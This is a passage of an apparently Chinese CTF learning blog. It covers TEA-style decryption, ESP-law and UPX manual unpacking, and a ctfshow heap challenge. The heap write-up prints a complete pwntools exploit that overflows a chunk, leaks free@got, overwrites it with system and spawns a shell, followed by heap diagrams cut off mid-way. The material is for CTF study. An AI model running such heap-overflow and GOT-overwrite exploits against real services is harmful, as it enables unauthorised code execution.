</li>
<li><strong>输出</strong>：密文数组 <code>v</code>（原始明文被加密）。</li>
</ul>
<p>解密原理</p>
<ul>
<li><strong>输入</strong>：密文数组 <code>v</code>、负长度 <code>-n</code>（触发解密模式）、相同密钥 <code>k</code>。</li>
<li><strong>关键步骤</strong>：<ul>
<li>取 <code>n</code> 的绝对值，计算相同轮数 <code>rounds</code>。</li>
<li>初始化 <code>sum = rounds * DELTA</code>（加密最终值），<code>y = v[0]</code>。</li>
<li>多轮循环（每轮 <code>sum -= DELTA</code>）：<ul>
<li>计算 <code>e</code>（同加密）。</li>
<li>反向遍历数组（从最后一个元素到第二个），使用 <code>v[p] -= MX</code>（逆操作，恢复加密前值）。</li>
<li>更新第一个元素 <code>v[0] -= MX</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong>输出</strong>：明文数组 <code>v</code>（密文被解密）。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/" class="post-title-link" itemprop="url">ESP定律脱壳</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-24 20:58:47" itemprop="dateCreated datePublished" datetime="2025-08-24T20:58:47+08:00">2025-08-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 20:39:21" itemprop="dateModified" datetime="2025-09-23T20:39:21+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>先用dbg打开，F8步入发现第一个esp发生变化(除了载入时第一次变红)在ESP硬件下断点。</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/0.png" alt="0"></p>
<p>F9达到jne，继续F8，ret后面返回的就是oep的入口。</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/1.png" alt="1"></p>
<p>oep的入口</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/2.png" alt="2"></p>
<p>在这里dump就可以了</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/3.png" alt="3"></p>
<p>把第一步转储的修复</p>
<p><img src="/2025/08/24/ESP%E5%AE%9A%E5%BE%8B%E8%84%B1%E5%A3%B3/4.png" alt="4"></p>
<p>生成00.aspack_dump_SCY.exe用IDA打开就是脱壳了的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/" class="post-title-link" itemprop="url">upx手动脱壳</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-24 10:43:01" itemprop="dateCreated datePublished" datetime="2025-08-24T10:43:01+08:00">2025-08-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:08:53" itemprop="dateModified" datetime="2025-09-23T21:08:53+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/%E6%80%BB%E7%BB%93/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/" itemprop="url" rel="index"><span itemprop="name">upx手动脱壳</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>感谢霍爷教我upx脱壳</p>
<p>第一步设置入口处断点，只保留入口处断点</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/1.png" alt="1"></p>
<p>调试–&gt;运行 ,达到pushad</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/2.png" alt="2"></p>
<p>在堆栈区下断点</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/3.png" alt="3"></p>
<p>F9运行到popad</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/4.png" alt="4"></p>
<p>看到循环F4跳过</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/5.png" alt="5"></p>
<p>接着看到一大部分寄存器初始化</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/6.png" alt="6"></p>
<p>F7单步进入</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/7.png" alt="7"></p>
<p>达到入口</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/8.png" alt="8"></p>
<p>用syclla</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/9.png" alt="9"></p>
<p>先点击转储，出现一个dump.exe在用IAT两次确定后获取导入，最后修复转储是选择刚刚的dump.exe就可以得到dump_SCY.exe，用IDA打开</p>
<p><img src="/2025/08/24/upx%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/10.png" alt="10"></p>
<p>成功脱壳。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/08/12/%E5%A0%86%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0ctfshow-160/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/08/12/%E5%A0%86%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0ctfshow-160/" class="post-title-link" itemprop="url">堆利用学习ctfshow(160~?)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-08-12 21:39:46" itemprop="dateCreated datePublished" datetime="2025-08-12T21:39:46+08:00">2025-08-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:11:27" itemprop="dateModified" datetime="2025-09-23T21:11:27+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/heap/" itemprop="url" rel="index"><span itemprop="name">heap</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/KaliLinux_V/article/details/140321156">参考文章</a></p>
<h2 id="160"><a href="#160" class="headerlink" title="160"></a>160</h2><p>找到漏洞点在exit处</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_80488C0</span><span class="params">(<span class="type">unsigned</span> __int8 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; (<span class="type">unsigned</span> __int8)byte_804B061 &amp;&amp; *((_DWORD *)&amp;unk_804B080 + a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u%c&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( **((_DWORD **)&amp;unk_804B080 + a1) + v2 &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)&amp;unk_804B080 + a1) - <span class="number">4</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wtf?&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;text: &quot;</span>);</span><br><span class="line">    sub_8048846(**((_DWORD **)&amp;unk_804B080 + a1), v2 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_8048EF0();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**((_DWORD **)&amp;unk_804B080 + a1) + v2 &gt;= (<span class="type">unsigned</span> <span class="type">int</span>)(*((_DWORD *)&amp;unk_804B080 + a1) - <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p>这个判断处在漏洞,它是通过限制修改的长度，使得我们自己创建的chunk地址加上修改长度不能超过系统创建的chunk的长度。</p>
<p>但是这种限制是可以绕过的。</p>
<p>虚拟机高级会自己检查出堆溢出，等我配个低级的虚拟机再继续来写，不然无法调试。</p>
<p>安装好了ubuntu20继续做题。</p>
<p>来动调看看变化，还是有自动检查，不知道什么问题。只能先放这里了，目前只只能理论上理解这题了。</p>
<p>附个佬的exp,再用图来解释攻击过程。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;xxxx&quot;</span>, xxxx)</span><br><span class="line"><span class="comment"># io = process(pwnfile)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;xxxx.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :io.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims		    :io.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :io.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address,data       :log.success(<span class="string">&#x27;%s: &#x27;</span>%(address)+<span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data,size1,data1</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;0&quot;</span>)</span><br><span class="line">	ru(<span class="string">b&quot;size of description: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;name: &quot;</span>)</span><br><span class="line">	sl(data)</span><br><span class="line">	ru(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size1))</span><br><span class="line">	ru(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">	sl(data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">	sla(<span class="string">b&quot;Action: &quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">	sla(<span class="string">b&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	ru(<span class="string">b&quot;text length: &quot;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">b&quot;text: &quot;</span>)</span><br><span class="line">	sl(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&quot;aaaa&quot;</span>,<span class="number">0x80</span>,<span class="string">b&quot;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&quot;vvvv&quot;</span>,<span class="number">0x100</span>,<span class="string">b&quot;gggg&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x200</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+<span class="string">b&quot;a&quot;</span>*<span class="number">0x80</span>+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u32(io.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p32(system_addr))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>Step 1：连续 <code>add</code> 三次后的初始布局（A 与 S 紧挨）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk0 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0090</span><br><span class="line">| 系统chunk0 (0x80)    |  # add(0x80) &quot;bbbb&quot;</span><br><span class="line">| 数据区: 0x8ee0098     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0118</span><br><span class="line">| 主chunk1 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # add(0x80) &quot;bbbb&quot;</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # add(0x80) &quot;aaaa&quot;</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # add(0x80) &quot;/bin/sh;&quot;</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 2：<code>free(0)</code> 后，A0+S0 合并为空闲（低地址形成大洞）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| FREE(A0+S0)          |  # free(0) 后 A0 与 S0 合并为空闲段</span><br><span class="line">| 范围: 0x8ee0000 ~ 0x8ee0118</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0118</span><br><span class="line">| 主chunk1 (0x80)      |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # 保持不变</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 3：再次 <code>add(0x100, &quot;vvvv&quot;, 0x100, &quot;gggg&quot;)</code></p>
<p>新的 <strong>主chunk3(0x100)</strong> 优先复用低地址的 FREE（把洞吃掉）；</p>
<p>但配套的 <strong>系统chunk3(0x100)</strong> 因附近无相邻空间，只能从 <strong>TOP CHUNK</strong>（高地址）再切一块出来，因此被<strong>甩到更远处</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk3 (0x100)     |  # 新的用户块，复用低地址 FREE</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0108</span><br><span class="line">| 主chunk1 (0x80)      |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee0120     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee01a0</span><br><span class="line">| 系统chunk1 (0x80)    |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee01a8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0228</span><br><span class="line">| 主chunk2 (0x80)      |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee0230     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee02b0</span><br><span class="line">| 系统chunk2 (0x80)    |  # 仍在原位</span><br><span class="line">| 数据区: 0x8ee02b8     |</span><br><span class="line">+----------------------+ &lt;-- 0x8ee0400           （举例）</span><br><span class="line">| 系统chunk3 (0x100)   |  # 从 TOP 切分的新系统块（远端高地址）</span><br><span class="line">| 数据区: 0x8ee0408     |</span><br><span class="line">+----------------------+</span><br><span class="line">| TOP CHUNK            |</span><br><span class="line">高地址 ↑</span><br></pre></td></tr></table></figure>

<p>Step 4：<code>edit(3,0x200, ...)</code> 溢出伪造</p>
<ul>
<li>主chunk3(0x100) 本来在低地址，edit(3,0x200, …) 写入 <strong>超过 0x100</strong> 的数据，覆盖到相邻的 <strong>主chunk1 &#x2F; 系统chunk1</strong> 的头部。</li>
<li>payload 把它们伪造成 <code>size=0x89</code> 的 fake chunk，并在 fd 指针写入 <strong>free@got</strong>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">+----------------------+ &lt;-- 0x8ee0000</span><br><span class="line">| 主chunk3 (0x100)     |  # 用户可控，edit(3,...) 时从这里开始写</span><br><span class="line">| 数据区: 0x8ee0008     |</span><br><span class="line">| ... 溢出覆盖 ...      |</span><br><span class="line">| fake size=0x89       |  # 伪造chunk头</span><br><span class="line">| fd=free_got          |  